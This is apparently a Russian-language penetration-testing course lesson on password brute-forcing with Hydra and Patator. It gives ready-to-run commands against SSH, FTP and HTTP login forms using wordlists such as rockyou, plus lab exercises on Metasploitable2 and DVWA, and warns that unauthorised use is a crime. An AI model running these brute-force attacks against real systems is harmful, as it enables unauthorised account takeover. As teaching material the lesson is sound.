# Урок 36: Hydra и Patator — брутфорс паролей

## Теория

**Hydra** (THC Hydra) — классический инструмент для брутфорса паролей по сетевым протоколам. Поддерживает множество сервисов: SSH, FTP, HTTP, SMB, VNC, RDP и др.

**Patator** — более современный инструмент, написанный на Python. Меньше шумит, лучше обрабатывает ошибки, поддерживает многопоточность.

ВАЖНО: Используйте только на легальных целях (свои лаборатории, с разрешения владельца). Несанкционированный брутфорс — преступление.

## Практическое занятие

### Hydra

```bash
# Установка
sudo apt install hydra

# Проверка сервисов
hydra -U

# Брутфорс SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Брутфорс FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.1

# Брутфорс HTTP Form (POST)
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Брутфорс HTTP Basic Auth
hydra -l admin -P wordlist.txt 192.168.1.1 http-get /admin/

# Настройка количества потоков
hydra -t 4 -l admin -P wordlist.txt ssh://192.168.1.1
```

### Параметры Hydra
```
-l — один логин
-L — файл со списком логинов
-p — один пароль
-P — файл с паролями
-t — количество потоков
-s — конкретный порт
-v — подробный вывод
-V — вывод каждой попытки
-f — остановиться при первом успехе
```

### Patator

```bash
# Установка
git clone https://github.com/lanjelot/patator.git
cd patator

# Брутфорс SSH
python3 patator.py ssh_login host=192.168.1.1 user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt

# Брутфорс FTP
python3 patator.py ftp_login host=192.168.1.1 user=admin password=FILE0 0=wordlist.txt

# Брутфорс HTTP
python3 patator.py http_fuzz url=http://192.168.1.1/admin.php method=POST body='user=admin&pass=FILE0' 0=wordlist.txt

# Настройка задержки (не спамить)
python3 patator.py ssh_login host=192.168.1.1 user=admin password=FILE0 0=wordlist.txt -x ignore:mesh='incorrect' delay=2
```

## Задачи для самостоятельного выполнения

1. Настройте Metasploitable2. Создайте пользователя с простым паролем. Используйте Hydra для брутфорса SSH. Удалось ли подобрать пароль?

2. Установите DVWA. Настройте форму логина. Используйте Hydra для брутфорса HTTP POST формы. Изучите, как определять успешный вход (параметр `:S=` или `:F=`).

3. Сравните Hydra и Patator на одной и той же задаче. Какой инструмент удобнее и почему?

4. Используйте маленький словарь (10 паролей) и попробуйте подобрать пароль для FTP на Metasploitable. Какой флаг показывает каждую попытку?

5. Напишите скрипт на Bash, который автоматически запускает Hydra с проверкой нескольких сервисов (SSH, FTP, Telnet) одного хоста.
